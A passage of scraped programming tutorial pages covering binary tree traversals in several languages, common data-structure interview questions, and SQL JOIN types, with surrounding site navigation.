left; struct node* right; }; /* Helper function that allocates a new node with the given data and NULL left and right pointers. */ struct node* newNode(int data) { struct node* node = (struct node*) malloc(sizeof(struct node)); node->data = data; node->left = NULL; node->right = NULL; return(node); } /* Given a binary tree, print its nodes according to the "bottom-up" postorder traversal. */ void printPostorder(struct node* node) { if (node == NULL) return; // first recur on left subtree printPostorder(node->left); // then recur on right subtree printPostorder(node->right); // now deal with the node printf("%d ", node->data); } /* Given a binary tree, print its nodes in inorder*/ void printInorder(struct node* node) { if (node == NULL) return; /* first recur on left child */ printInorder(node->left); /* then print the data of node */ printf("%d ", node->data); /* now recur on right child */ printInorder(node->right); } /* Given a binary tree, print its nodes in preorder*/ void printPreorder(struct node* node) { if (node == NULL) return; /* first print data of node */ printf("%d ", node->data); /* then recur on left sutree */ printPreorder(node->left); /* now recur on right subtree */ printPreorder(node->right); } /* Driver program to test above functions*/ int main() { struct node *root = newNode(1); root->left = newNode(2); root->right = newNode(3); root->left->left = newNode(4); root->left->right = newNode(5); printf("\nPreorder traversal of binary tree is \n"); printPreorder(root); printf("\nInorder traversal of binary tree is \n"); printInorder(root); printf("\nPostorder traversal of binary tree is \n"); printPostorder(root); getchar(); return 0; } chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Python program to for tree traversals # A class that represents an individual node in a # Binary Tree class Node: def __init__(self,key): self.left = None self.right = None self.val = key # A function to do inorder tree traversal def printInorder(root): if root: # First recur on left child printInorder(root.left) # then print the data of node print(root.val), # now recur on right child printInorder(root.right) # A function to do postorder tree traversal def printPostorder(root): if root: # First recur on left child printPostorder(root.left) # the recur on right child printPostorder(root.right) # now print the data of node print(root.val), # A function to do preorder tree traversal def printPreorder(root): if root: # First print the data of node print(root.val), # Then recur on left child printPreorder(root.left) # Finally recur on right child printPreorder(root.right) # Driver code root = Node(1) root.left = Node(2) root.right = Node(3) root.left.left = Node(4) root.left.right = Node(5) print "Preorder traversal of binary tree is" printPreorder(root) print "\nInorder traversal of binary tree is" printInorder(root) print "\nPostorder traversal of binary tree is" printPostorder(root) chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for different tree traversals /* Class containing left and right child of current node and key value*/ class Node { int key; Node left, right; public Node(int item) { key = item; left = right = null; } } class BinaryTree { // Root of Binary Tree Node root; BinaryTree() { root = null; } /* Given a binary tree, print its nodes according to the "bottom-up" postorder traversal. */ void printPostorder(Node node) { if (node == null) return; // first recur on left subtree printPostorder(node.left); // then recur on right subtree printPostorder(node.right); // now deal with the node System.out.print(node.key + " "); } /* Given a binary tree, print its nodes in inorder*/ void printInorder(Node node) { if (node == null) return; /* first recur on left child */ printInorder(node.left); /* then print the data of node */ System.out.print(node.key + " "); /* now recur on right child */ printInorder(node.right); } /* Given a binary tree, print its nodes in preorder*/ void printPreorder(Node node) { if (node == null) return; /* first print data of node */ System.out.print(node.key + " "); /* then recur on left sutree */ printPreorder(node.left); /* now recur on right subtree */ printPreorder(node.right); } // Wrappers over above recursive functions void printPostorder() { printPostorder(root); } void printInorder() { printInorder(root); } void printPreorder() { printPreorder(root); } // Driver method public static void main(String[] args) { BinaryTree tree = new BinaryTree(); tree.root = new Node(1); tree.root.left = new Node(2); tree.root.right = new Node(3); tree.root.left.left = new Node(4); tree.root.left.right = new Node(5); System.out.println("Preorder traversal of binary tree is "); tree.printPreorder(); System.out.println("\nInorder traversal of binary tree is "); tree.printInorder(); System.out.println("\nPostorder traversal of binary tree is "); tree.printPostorder(); } } chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for different // tree traversals using System; /* Class containing left and right child of current node and key value*/ class Node { public int key; public Node left, right; public Node(int item) { key = item; left = right = null; } } class BinaryTree { // Root of Binary Tree Node root; BinaryTree() { root = null; } /* Given a binary tree, print its nodes according to the "bottom-up" postorder traversal. */ void printPostorder(Node node) { if (node == null) return; // first recur on left subtree printPostorder(node.left); // then recur on right subtree printPostorder(node.right); // now deal with the node Console.Write(node.key + " "); } /* Given a binary tree, print its nodes in inorder*/ void printInorder(Node node) { if (node == null) return; /* first recur on left child */ printInorder(node.left); /* then print the data of node */ Console.Write(node.key + " "); /* now recur on right child */ printInorder(node.right); } /* Given a binary tree, print its nodes in preorder*/ void printPreorder(Node node) { if (node == null) return; /* first print data of node */ Console.Write(node.key + " "); /* then recur on left sutree */ printPreorder(node.left); /* now recur on right subtree */ printPreorder(node.right); } // Wrappers over above recursive functions void printPostorder() {printPostorder(root);} void printInorder() {printInorder(root);} void printPreorder() {printPreorder(root);} // Driver Code static public void Main(String []args) { BinaryTree tree = new BinaryTree(); tree.root = new Node(1); tree.root.left = new Node(2); tree.root.right = new Node(3); tree.root.left.left = new Node(4); tree.root.left.right = new Node(5); Console.WriteLine("Preorder traversal " + "of binary tree is "); tree.printPreorder(); Console.WriteLine("\nInorder traversal " + "of binary tree is "); tree.printInorder(); Console.WriteLine("\nPostorder traversal " + "of binary tree is "); tree.printPostorder(); } } // This code is contributed by Arnab Kundu chevron_right filter_none Output: Preorder traversal of binary tree is 1 2 4 5 3 Inorder traversal of binary tree is 4 2 5 1 3 Postorder traversal of binary tree is 4 5 2 3 1 One more example: Time Complexity: O(n) Let us see different corner cases. Complexity function T(n) — for all problem where tree traversal is involved — can be defined as: T(n) = T(k) + T(n – k – 1) + c Where k is the number of nodes on one side of root and n-k-1 on the other side. Let’s do an analysis of boundary conditions Case 1: Skewed tree (One of the subtrees is empty and other subtree is non-empty ) k is 0 in this case. T(n) = T(0) + T(n-1) + c T(n) = 2T(0) + T(n-2) + 2c T(n) = 3T(0) + T(n-3) + 3c T(n) = 4T(0) + T(n-4) + 4c ………………………………………… …………………………………………. T(n) = (n-1)T(0) + T(1) + (n-1)c T(n) = nT(0) + (n)c Value of T(0) will be some constant say d. (traversing a empty tree will take some constants time) T(n) = n(c+d) T(n) = Θ(n) (Theta of n) Case 2: Both left and right subtrees have equal number of nodes. T(n) = 2T(|_n/2_|) + c This recursive function is in the standard form (T(n) = aT(n/b) + (-)(n) ) for master method http://en.wikipedia.org/wiki/Master_theorem. If we solve it by master method we get (-)(n) Auxiliary Space : If we don’t consider size of stack for function calls then O(1) otherwise O(n). Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Check if given Preorder, Inorder and Postorder traversals are of same tree | Set 2Check if given Preorder, Inorder and Postorder traversals are of same treePreorder from Inorder and Postorder traversalsPrint Postorder traversal from given Inorder and Preorder traversalsConstruct Full Binary Tree from given preorder and postorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct Full Binary Tree using its Preorder traversal and Preorder traversal of its mirror treeConstruct a tree from Inorder and Level order traversals | Set 1Construct a tree from Inorder and Level order traversals | Set 2Construct a Binary Tree from Postorder and InorderFind postorder traversal of BST from preorder traversalCheck if a binary tree is subtree of another binary tree using preorder traversal : IterativeCartesian tree from inorder traversal | Segment TreePostorder traversal of Binary Tree without recursion and without stackConstruct a Binary Search Tree from given postorderPostorder successor of a Node in Binary TreeFind n-th node in Postorder traversal of a Binary TreeIterative Postorder Traversal of N-ary TreeFind parent of given node in a Binary Tree with given postorder traversalPostorder predecessor of a Node in Binary Search TreeImproved By : danielbritten, andrew1234 Article Tags : ArticlesTreeInorder TraversalPostOrder TraversalPreorder TraversalSnapdealtree-traversalTrees Practice Tags : SnapdealTree thumb_up 187 To-do Done 1.6 Based on 452 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Next last_page Write a program to Calculate Size of a tree | Recursion Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles find command in Linux with examplesHow to write a Pseudo Code?Understanding "extern" keyword in CMutex vs SemaphoreSQL | GROUP BY Most visited in Tree AVL Tree | Set 1 (Insertion)Binary Tree | Set 3 (Types of Binary Tree)Binary Tree | Set 1 (Introduction)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeBinary Tree | Set 2 (Properties) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Commonly Asked Data Structure Interview Questions | Set 1 - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Commonly Asked Algorithm Interview Questions | Set 1Commonly Asked Data Structure Interview Questions | Set 1Top 10 algorithms in Interview QuestionsN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderConstruct Full Binary Tree from given preorder and postorder traversalsMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Must Do Coding Questions Company-wisePractice for cracking any coding interviewAnalysis of Algorithms | Set 1 (Asymptotic Analysis) Commonly Asked Data Structure Interview Questions | Set 1 Last Updated: 06-11-2020 What is a Data Structure? A data structure is a way of organizing the data so that the data can be used efficiently. Different kinds of data structures are suited to different kinds of applications, and some are highly specialized to specific tasks. For example, B-trees are particularly well-suited for the implementation of databases, while compiler implementations usually use hash tables to look up identifiers. (Source: Wiki Page) What are linear and non-linear data Structures? Linear: A data structure is said to be linear if its elements form a sequence or a linear list. Examples: Array. Linked List, Stacks and Queues Non-Linear: A data structure is said to be non-linear if the traversal of nodes is nonlinear in nature. Example: Graph and Trees. What are the various operations that can be performed on different Data Structures? Insertion ? Add a new data item in the given collection of data items. Deletion ? Delete an existing data item from the given collection of data items. Traversal ? Access each data item exactly once so that it can be processed. Searching ? Find out the location of the data item if it exists in the given collection of data items. Sorting ? Arranging the data items in some order i.e. in ascending or descending order in case of numerical data and in dictionary order in case of alphanumeric data. How is an Array different from Linked List? The size of the arrays is fixed, Linked Lists are Dynamic in size. Inserting and deleting a new element in an array of elements is expensive, Whereas both insertion and deletion can easily be done in Linked Lists. Random access is not allowed in Linked Listed. Extra memory space for a pointer is required with each element of the Linked list. Arrays have better cache locality that can make a pretty big difference in performance. What is Stack and where it can be used? Stack is a linear data structure which the order LIFO(Last In First Out) or FILO(First In Last Out) for accessing elements. Basic operations of the stack are: Push, Pop, Peek Applications of Stack: Infix to Postfix Conversion using Stack Evaluation of Postfix Expression Reverse a String using Stack Implement two stacks in an array Check for balanced parentheses in an expression What is a Queue, how it is different from the stack and how is it implemented? Queue is a linear structure that follows the order is First In First Out (FIFO) to access elements. Mainly the following are basic operations on queue: Enqueue, Dequeue, Front, Rear The difference between stacks and queues is in removing. In a stack we remove the item the most recently added; in a queue, we remove the item the least recently added. Both Queues and Stacks can be implemented using Arrays and Linked Lists. What are Infix, prefix, Postfix notations? Infix notation: X + Y – Operators are written in-between their operands. This is the usual way we write expressions. An expression such as A * ( B + C ) / D Postfix notation (also known as “Reverse Polish notation”): X Y + Operators are written after their operands. The infix expression given above is equivalent to A B C + * D/ Prefix notation (also known as “Polish notation”): + X Y Operators are written before their operands. The expressions given above are equivalent to / * A + B C D Converting between these notations: Click here What is a Linked List and What are its types? A linked list is a linear data structure (like arrays) where each element is a separate object. Each element (that is node) of a list is comprising of two items – the data and a reference to the next node.Types of Linked List : Singly Linked List : In this type of linked list, every node stores address or reference of next node in list and the last node has next address or reference as NULL. For example 1->2->3->4->NULL Doubly Linked List : Here, here are two references associated with each node, One of the reference points to the next node and one to the previous node. Eg. NULL<-1<->2<->3->NULL Circular Linked List : Circular linked list is a linked list where all nodes are connected to form a circle. There is no NULL at the end. A circular linked list can be a singly circular linked list or doubly circular linked list. Eg. 1->2->3->1 [The next pointer of last node is pointing to the first] Which data structures are used for BFS and DFS of a graph? Queue is used for BFS Stack is used for DFS. DFS can also be implemented using recursion (Note that recursion also uses function call stack). Can doubly linked be implemented using a single pointer variable in every node? Doubly linked list can be implemented using a single pointer. See XOR Linked List – A Memory Efficient Doubly Linked List How to implement a stack using queue? A stack can be implemented using two queues. Let stack to be implemented be ‘s’ and queues used to implement be ‘q1’ and ‘q2’. Stack ‘s’ can be implemented in two ways: Method 1 (By making push operation costly) Method 2 (By making pop operation costly) See Implement Stack using Queues How to implement a queue using stack? A queue can be implemented using two stacks. Let queue to be implemented be q and stacks used to implement q be stack1 and stack2. q can be implemented in two ways: Method 1 (By making enQueue operation costly) Method 2 (By making deQueue operation costly) See Implement Queue using Stacks Which Data Structure Should be used for implementing LRU cache? We use two data structures to implement an LRU Cache. Queue which is implemented using a doubly linked list. The maximum size of the queue will be equal to the total number of frames available (cache size). The most recently used pages will be near rear end and least recently pages will be near front end. A Hash with page number as key and address of the corresponding queue node as value. See How to implement LRU caching scheme? What data structures should be used? How to check if a given Binary Tree is BST or not? If inorder traversal of a binary tree is sorted, then the binary tree is BST. The idea is to simply do inorder traversal and while traversing keep track of previous key value. If current key value is greater, then continue, else return false. See A program to check if a binary tree is BST or not for more details. Linked List Questions Linked List Insertion Linked List Deletion middle of a given linked list Nth node from the end of a Linked List Tree Traversal Questions Inorder Preorder and Postoder Traversals Level order traversal Height of Binary Tree Convert a DLL to Binary Tree in-place See In-place conversion of Sorted DLL to Balanced BST Convert Binary Tree to DLL in-place See Convert a given Binary Tree to Doubly Linked List | Set 1, Convert a given Binary Tree to Doubly Linked List | Set 2 Delete a given node in a singly linked list Given only a pointer to a node to be deleted in a singly linked list, how do you delete it? Reverse a Linked List Write a function to reverse a linked list Detect Loop in a Linked List Write a C function to detect loop in a linked list. Which data structure is used for dictionary and spell checker? Data Structure for Dictionary and Spell Checker? You may also like Practice Quizzes on Data Structures Last Minute Notes – DS Common Interview Puzzles Amazon’s most asked interview questions Microsoft’s most asked interview questions Accenture’s most asked Interview Questions Commonly Asked OOP Interview Questions Commonly Asked C++ Interview Questions, Commonly Asked C Programming Interview Questions | Set 1 Commonly Asked C Programming Interview Questions | Set 2 Commonly asked DBMS interview questions | Set 1 Commonly Asked Operating Systems Interview Questions | Set 1 Commonly Asked Data Structure Interview Questions Commonly Asked Algorithm Interview Questions Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Recommended Posts:Commonly Asked C Programming Interview Questions | Set 1Commonly Asked C++ Interview Questions | Set 1Commonly Asked OOP Interview Questions | Set 1Commonly Asked C++ Interview Questions | Set 2Commonly Asked Java Programming Interview Questions | Set 2Commonly Asked Algorithm Interview Questions | Set 1Commonly asked JavaScript Interview Questions | Set 1Commonly Asked C Programming Interview Questions | Set 3Commonly Asked C Programming Interview Questions | Set 2Commonly asked Interview Questions for Front End DevelopersCommonly Asked Questions in Goldman Sachs InterviewsAmazon’s most frequently asked interview questions | Set 210 Most asked Questions from Java ProgrammersMAQ Software most Frequently Asked QuestionsFrequently asked questions for Java Developer Position from a fresherFrequently Asked Questions regarding PlacementsStructure Member Alignment, Padding and Data PackingDesign a Queue data structure to get minimum or maximum in O(1) timeTop 10 algorithms in Interview Questions | Set 2JavaScript Interview Questions and Answers | Set 3Improved By : shashikantdurge, ShashankeshUpadhyay Article Tags : Articlesinterview-preparationplacement preparation thumb_up 59 To-do Done 2.5 Based on 45 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 4 (Analysis of Loops) Next last_page Time Complexity of Loop with Powers Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles SQL | Join (Inner, Left, Right and Full Joins)find command in Linux with examplesHow to write a Pseudo Code?Understanding "extern" keyword in CAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases) More related articles in Articles Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreSQL | GROUP BYSQL | ViewsAnalysis of Algorithms | Set 4 (Analysis of Loops) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

SQL | Join (Inner, Left, Right and Full Joins) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ SQL | Join (Cartesian Join & Self Join)SQL | Join (Inner, Left, Right and Full Joins)SQL | Union ClauseHow to Install VirtualBox on Windows?Installing MongoDB on Windows with PythonMongoDB and PythonMongoDB : An introductionMongoDB: Getting StartedMongoDB vs MySQLDifference between SQL and NoSQLSQL vs NoSQL: Which one is better to use?Introduction to NoSQLSQL | WITH clauseSQL | With Ties ClauseSQL | Arithmetic OperatorsSQL | Wildcard operatorsSQL | Intersect & Except clauseSQL | USING ClauseSQL | MERGE StatementMERGE Statement in SQL ExplainedSQL | DDL, DQL, DML, DCL and TCL CommandsSQL | DROP, TRUNCATESQL | AliasesMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis) SQL | Join (Inner, Left, Right and Full Joins) Last Updated: 09-11-2020 A SQL Join statement is used to combine data or rows from two or more tables based on a common field between them. Different types of Joins are: INNER JOIN LEFT JOIN RIGHT JOIN FULL JOIN Consider the two tables below: Student StudentCourse The simplest Join is INNER JOIN. INNER JOIN: The INNER JOIN keyword selects all rows from both the tables as long as the condition satisfies. This keyword will create the result-set by combining all rows from both the tables where the condition satisfies i.e value of the common field will be same. Syntax: SELECT table1.column1,table1.column2,table2.column1,.... FROM table1 INNER JOIN table2 ON table1.matching_column = table2.matching_column; table1: First table. table2: Second table matching_column: Column common to both the tables. Note: We can also write JOIN instead of INNER JOIN. JOIN is same as INNER JOIN. Example Queries(INNER JOIN) This query will show the names and age of students enrolled in different courses. SELECT StudentCourse.COURSE_ID, Student.NAME, Student.AGE FROM Student INNER JOIN StudentCourse ON Student.ROLL_NO = StudentCourse.ROLL_NO; Output: LEFT JOIN: This join returns all the rows of the table on the left side of the join and matching rows for the table on the right side of join. The rows for which there is no matching row on right side, the result-set will contain null. LEFT JOIN is also known as LEFT OUTER JOIN.Syntax: SELECT table1.column1,table1.column2,table2.column1,.... FROM table1 LEFT JOIN table2 ON table1.matching_column = table2.matching_column; table1: First table. table2: Second table matching_column: Column common to both the tables. Note: We can also use LEFT OUTER JOIN instead of LEFT JOIN, both are same. Example Queries(LEFT JOIN): SELECT Student.NAME,StudentCourse.COURSE_ID FROM Student LEFT JOIN StudentCourse ON StudentCourse.ROLL_NO = Student.ROLL_NO; Output: RIGHT JOIN: RIGHT JOIN is similar to LEFT JOIN. This join returns all the rows of the table on the right side of the join and matching rows for the table on the left side of join. The rows for which there is no matching row on left side, the result-set will contain null. RIGHT JOIN is also known as RIGHT OUTER JOIN.Syntax: SELECT table1.column1,table1.column2,table2.column1,.... FROM table1 RIGHT JOIN table2 ON table1.matching_column = table2.matching_column; table1: First table. table2: Second table matching_column: Column common to both the tables. Note: We can also use RIGHT OUTER JOIN instead of RIGHT JOIN, both are same. Example Queries(RIGHT JOIN): SELECT Student.NAME,StudentCourse.COURSE_ID FROM Student RIGHT JOIN StudentCourse ON StudentCourse.ROLL_NO = Student.ROLL_NO; Output: FULL JOIN: FULL JOIN creates the result-set by combining result of both LEFT JOIN and RIGHT JOIN. The result-set will contain all the rows from both the tables. The rows for which there is no matching, the result-set will contain NULL values.Syntax: SELECT table1.column1,table1.column2,table2.column1,.... FROM table1 FULL JOIN table2 ON table1.matching_column = table2.matching_column; table1: First table. table2: Second table matching_column: Column common to both the tables. Example Queries(FULL JOIN): SELECT Student.NAME,StudentCourse.COURSE_ID FROM Student FULL JOIN StudentCourse ON StudentCourse.ROLL_NO = Student.ROLL_NO; Output: Left JOIN (Video) Right JOIN (Video) Full JOIN (Video) SQL | JOIN (Cartesian Join, Self Join) This article is contributed by Harsh Agarwal . If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important CS Theory concepts for SDE interviews with the CS Theory Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Full join and Inner join in MS SQL ServerDifference between Inner Join and Outer Join in SQLDifference between Natural join and Inner Join in SQLLeft join and Right join in MS SQL ServerSQL | Join (Cartesian Join & Self Join)Inner Join vs Outer JoinDifference between Left, Right and Full Outer JoinDifference between Natural join and Cross join in SQLSelf Join and Cross Join in MS SQL ServerSQL | EQUI Join and NON EQUI JOINCombining aggregate and non-aggregate values in SQL using Joins and Over clauseJoins in MS SQL ServerDifference between Nested Loop Join and Hash JoinDifference between Nested Loop join and Sort Merge JoinDifference between Hash Join and Sort Merge JoinDifference between Structured Query Language (SQL) and Transact-SQL (T-SQL)Difference between JOIN and UNION in SQLSQL Join vs SubquerySQL | UPDATE with JOINLeft() and Right() Function in MS Access Article Tags : ArticlesDBMSSQLDBMS-JoinSQL-Clauses-Operators Practice Tags : DBMSSQL thumb_up 48 To-do Done 2.2 Based on 51 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page SQL | Wildcard operators Next last_page SQL | Union Clause Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles find command in Linux with examplesHow to write a Pseudo Code?Understanding "extern" keyword in CAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations) Most visited in DBMS ACID Properties in DBMSConflict Serializability in DBMSNormal Forms in DBMSKDD Process in Data MiningSQL query to find second highest salary? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Practice for cracking any coding interview - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderWhat is Memory Leak? How can we avoid? 